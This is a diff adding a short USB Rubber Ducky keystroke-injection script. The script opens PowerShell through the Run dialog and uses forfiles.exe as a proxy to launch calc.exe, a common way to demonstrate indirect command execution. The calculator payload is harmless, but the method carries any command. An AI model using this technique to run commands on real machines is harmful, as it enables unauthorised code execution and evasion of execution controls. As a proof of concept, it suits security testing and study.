@@ -1,0 +1,8 @@
+REM by Joshua O' Brien
+REM uses ForFiles.exe to execute a command ( calc.exe in this case)
+GUI r
+DEFAULT_DELAY 350
+STRING powershell
+ENTER
+STRING forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c c:\windows\system32\calc.exe"
+ENTER
